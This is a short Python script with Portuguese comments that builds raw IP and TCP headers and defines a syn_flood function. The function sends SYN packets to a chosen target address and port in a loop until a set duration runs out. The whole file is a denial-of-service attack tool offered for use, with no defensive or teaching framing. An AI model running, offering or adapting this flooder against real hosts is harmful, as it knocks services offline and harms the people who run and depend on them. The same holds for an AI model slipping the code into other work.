import socket
import random
from struct import pack
import time

# Função para calcular o checksum
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

# Função para criar o pacote IP
def build_ip_header(source_ip, dest_ip):
    version = 4
    ihl = 5
    tos = 0
    tot_len = 20 + 20
    id = random.randint(18000, 65535)
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  # Checksum (placeholder)
    saddr = socket.inet_aton(source_ip)
    daddr = socket.inet_aton(dest_ip)

    ihl_version = (version << 4) + ihl
    return pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

# Função para criar o pacote TCP
def build_tcp_header(source_ip, dest_ip, source_port, dest_port):
    seq = 0
    ack_seq = 0
    doff = 5  # Data offset (TCP header size)
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4)
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
    
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = 20

    pseudo_header = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

    tcp_check = checksum(pseudo_header + tcp_header)
    tcp_header = pack('!HHLLBBH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window) + pack('H', tcp_check) + pack('!H', urg_ptr)
    return tcp_header

def syn_flood(target_ip, target_port, duration=60):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    source_ip = "192.168.0.100"  # Altere para o IP de origem
    source_port = random.randint(1024, 65535)

    end_time = time.time() + duration
    while time.time() < end_time:
        ip_header = build_ip_header(source_ip, target_ip)
        tcp_header = build_tcp_header(source_ip, target_ip, source_port, target_port)
        packet = ip_header + tcp_header

        sock.sendto(packet, (target_ip, 0))
        print(f'SYN packet sent to {target_ip}:{target_port} from {source_ip}:{source_port}')

    sock.close()
